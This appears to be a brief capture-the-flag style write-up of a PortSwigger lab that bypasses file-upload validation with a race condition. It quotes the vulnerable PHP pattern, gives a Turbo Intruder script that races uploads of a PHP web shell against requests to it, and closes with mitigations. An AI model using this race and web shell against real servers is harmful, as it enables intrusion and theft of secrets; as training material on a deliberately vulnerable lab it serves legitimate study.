# Lab 07 — Web shell upload via race condition

> **Expert** · [Official lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

**Entry point:** the upload code moves the file **before** validating it,
then unlinks on failure — win the race window.

```php
move_uploaded_file(...);           // file is live here
if (checkViruses($f) && checkFileType($f)) { ... } else { unlink($f); }
```

## Solution

1. Prepare `exploit.php` (the secret-reading shell).
2. Race it with **Turbo Intruder** (HTTP/1.1, single-packet style): spam the
   upload while a second engine hammers `GET /files/avatars/exploit.php`:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)
    for _ in range(20):
        engine.queue(target.req)          # upload (PHP file)
    for _ in range(20):
        engine.queue(target.req2, gate=2) # GET the shell
    engine.openGate(2)                    # fire together
```

3. One of the GETs lands inside the window before `unlink()` — the shell
   executes and returns the secret — submit it — lab solved.

## Mitigation

Validate **before** storing; store invalid uploads outside the webroot and
delete atomically; use random filenames in non-executing directories.
